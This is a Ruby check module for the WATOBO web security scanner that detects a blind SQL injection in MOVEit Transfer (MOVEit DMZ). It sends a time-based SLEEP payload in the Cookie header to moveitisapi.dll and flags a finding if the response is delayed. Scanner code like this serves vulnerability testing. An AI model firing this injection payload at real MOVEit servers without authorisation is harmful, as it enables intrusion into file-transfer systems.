# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Ipswitch
        #class Dir_indexing < Watobo::Mixin::Session
        class Moveit_sqlinjection < Watobo::ActiveCheck

          @info.update(
              :check_name => 'MoveIt SQL Injection', # name of check which briefly describes functionality, will be used for tree and progress views
              :description => "This module performs SQL injection checks.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0", # check version
              :check_group => "IPSwitch MoveIT"
          )

          @finding.update(
              :threat => "There's a blind SQL injection vulnerability in older MOVEit Transfer aka MOVEit DMZ versions", # thread of vulnerability, e.g. loss of information
              :class => "MoveIT DMZ: SQLInjection", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_CRITICAL,
              :references => ['https://www.siberas.de/assets/papers/ssa-1705_IPSWITCH_SQLinjection.txt']
          )

          def initialize(project, prefs={})
            super(project, prefs)

            @checked_locations = []
          end

          def reset()
            @checked_locations = []
          end

          def generateChecks(chat)
            dir = chat.request.dir
            return false if @checked_locations.include? dir
            @checked_locations << dir

            checker = proc {
              begin
                test_request = nil
                test_response = nil
                rtimes = []

                3.times do
                  test = chat.copyRequest
                  start = Time.now().to_i
                  t_request, t_response = doRequest(test, :default => true)
                  stop = Time.now().to_i
                  rtimes << (stop - start)
                end

                max_t = rtimes.max + 1
                max_t += 1 if max_t < 2

                timeout_t = 2 * max_t

                output = ""

                begin
                  timeout(max_t.to_f) do
                    test = chat.copyRequest
                    test.set_header('X-siLock-AgentBrand', 'yourout')

                    test.set_header("Cookie", "ASP.NET_SessionId=1111111111\\' AND (SELECT * FROM (SELECT(SLEEP(#{timeout_t})))AAAA) -- ;")

                    moveit_path = dir + '/moveitisapi/moveitisapi.dll?action=download'

                    test.set_path moveit_path
                    test_request = test.copy

                    dummy_request, test_response = doRequest(test, :default => true)

                  end
                rescue Timeout::Error

                  output << "Request didn't finish after max_t #{max_t}\nPrevious Response Times:\n- #{rtimes.join("\n- ")}"

                  addFinding(test_request, test_response,
                             :check_pattern => 'ASP.NET_SessionId',
                             :chat => chat,
                             :title => 'moveitisapi.dll?action=download',
                             :proof_pattern => "",
                             :test_item => '/moveitisapi/moveitisapi.dll?action=download',
                             :class => 'MOVEit SQL-Injection',
                             :output => output
                  )


                rescue => bang
                  puts bang
                  puts bang.backtrace
                end


              rescue => bang
                puts bang
                puts bang.backtrace if $DEBUG
              end
              [test_request, test_response]

            }
            yield checker
          end
        end
      end
    end
  end
end
